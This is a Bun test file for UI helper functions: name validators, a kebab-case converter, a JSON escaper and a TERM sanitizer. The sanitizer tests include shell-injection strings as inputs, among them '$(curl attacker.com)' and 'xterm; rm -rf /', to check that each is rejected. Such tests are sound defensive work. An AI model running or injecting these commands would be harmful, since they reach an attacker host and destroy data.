import { describe, it, expect } from "bun:test";

const {
  validateServerName,
  validateRegionName,
  validateModelId,
  toKebabCase,
  sanitizeTermValue,
  jsonEscape,
} = await import("../shared/ui.js");

// ── validateServerName ──────────────────────────────────────────────

describe("validateServerName", () => {
  it("accepts valid names", () => {
    expect(validateServerName("abc")).toBe(true);
    expect(validateServerName("spawn-test-1")).toBe(true);
    expect(validateServerName("my-server-123")).toBe(true);
    expect(validateServerName("a".repeat(63))).toBe(true);
  });

  it("rejects names shorter than 3 chars", () => {
    expect(validateServerName("")).toBe(false);
    expect(validateServerName("a")).toBe(false);
    expect(validateServerName("ab")).toBe(false);
  });

  it("rejects names longer than 63 chars", () => {
    expect(validateServerName("a".repeat(64))).toBe(false);
  });

  it("rejects names with special characters", () => {
    expect(validateServerName("my_server")).toBe(false);
    expect(validateServerName("my server")).toBe(false);
    expect(validateServerName("my.server")).toBe(false);
    expect(validateServerName("my@server")).toBe(false);
  });

  it("rejects names with leading or trailing dashes", () => {
    expect(validateServerName("-abc")).toBe(false);
    expect(validateServerName("abc-")).toBe(false);
    expect(validateServerName("-abc-")).toBe(false);
  });
});

// ── validateRegionName ──────────────────────────────────────────────

describe("validateRegionName", () => {
  it("accepts valid region names", () => {
    expect(validateRegionName("us-east-1")).toBe(true);
    expect(validateRegionName("eu_west_2")).toBe(true);
    expect(validateRegionName("a")).toBe(true);
    expect(validateRegionName("us-east1-b")).toBe(true);
  });

  it("rejects empty string", () => {
    expect(validateRegionName("")).toBe(false);
  });

  it("rejects names longer than 63 chars", () => {
    expect(validateRegionName("a".repeat(64))).toBe(false);
  });

  it("rejects names with invalid characters", () => {
    expect(validateRegionName("us east")).toBe(false);
    expect(validateRegionName("us.east")).toBe(false);
    expect(validateRegionName("us@east")).toBe(false);
  });
});

// ── validateModelId ─────────────────────────────────────────────────

describe("validateModelId", () => {
  it("accepts valid model IDs", () => {
    expect(validateModelId("anthropic/claude-3.5-sonnet")).toBe(true);
    expect(validateModelId("openai/gpt-4")).toBe(true);
    expect(validateModelId("meta-llama/llama-3:70b")).toBe(true);
  });

  it("returns true for empty string", () => {
    expect(validateModelId("")).toBe(true);
  });

  it("rejects model IDs with invalid characters", () => {
    expect(validateModelId("model name")).toBe(false);
    expect(validateModelId("model@id")).toBe(false);
    expect(validateModelId("model;id")).toBe(false);
  });
});

// ── toKebabCase ─────────────────────────────────────────────────────

describe("toKebabCase", () => {
  it("converts uppercase to lowercase", () => {
    expect(toKebabCase("MyServer")).toBe("myserver");
  });

  it("replaces spaces with dashes", () => {
    expect(toKebabCase("my server")).toBe("my-server");
  });

  it("replaces special characters with dashes", () => {
    expect(toKebabCase("my.server@cloud")).toBe("my-server-cloud");
  });

  it("collapses consecutive dashes", () => {
    expect(toKebabCase("my--server")).toBe("my-server");
    expect(toKebabCase("a...b")).toBe("a-b");
  });

  it("strips leading and trailing dashes", () => {
    expect(toKebabCase("-hello-")).toBe("hello");
    expect(toKebabCase("  hello  ")).toBe("hello");
  });
});

// ── sanitizeTermValue (security-critical) ───────────────────────────

describe("sanitizeTermValue", () => {
  it("passes through safe TERM values", () => {
    expect(sanitizeTermValue("xterm-256color")).toBe("xterm-256color");
    expect(sanitizeTermValue("screen")).toBe("screen");
    expect(sanitizeTermValue("vt100")).toBe("vt100");
    expect(sanitizeTermValue("tmux-256color")).toBe("tmux-256color");
    expect(sanitizeTermValue("linux")).toBe("linux");
  });

  it("rejects shell injection attempts", () => {
    expect(sanitizeTermValue("$(curl attacker.com)")).toBe("xterm-256color");
    expect(sanitizeTermValue("`whoami`")).toBe("xterm-256color");
    expect(sanitizeTermValue("xterm; rm -rf /")).toBe("xterm-256color");
    expect(sanitizeTermValue("xterm\ninjection")).toBe("xterm-256color");
  });

  it("rejects values with spaces or special chars", () => {
    expect(sanitizeTermValue("xterm 256")).toBe("xterm-256color");
    expect(sanitizeTermValue("term'quote")).toBe("xterm-256color");
    expect(sanitizeTermValue('term"double')).toBe("xterm-256color");
  });
});

// ── jsonEscape ──────────────────────────────────────────────────────

describe("jsonEscape", () => {
  it("wraps simple strings in quotes", () => {
    expect(jsonEscape("hello")).toBe('"hello"');
  });

  it("escapes double quotes", () => {
    expect(jsonEscape('say "hi"')).toBe('"say \\"hi\\""');
  });

  it("escapes newlines and tabs", () => {
    expect(jsonEscape("line1\nline2")).toBe('"line1\\nline2"');
    expect(jsonEscape("col1\tcol2")).toBe('"col1\\tcol2"');
  });

  it("escapes backslashes", () => {
    expect(jsonEscape("path\\to\\file")).toBe('"path\\\\to\\\\file"');
  });
});
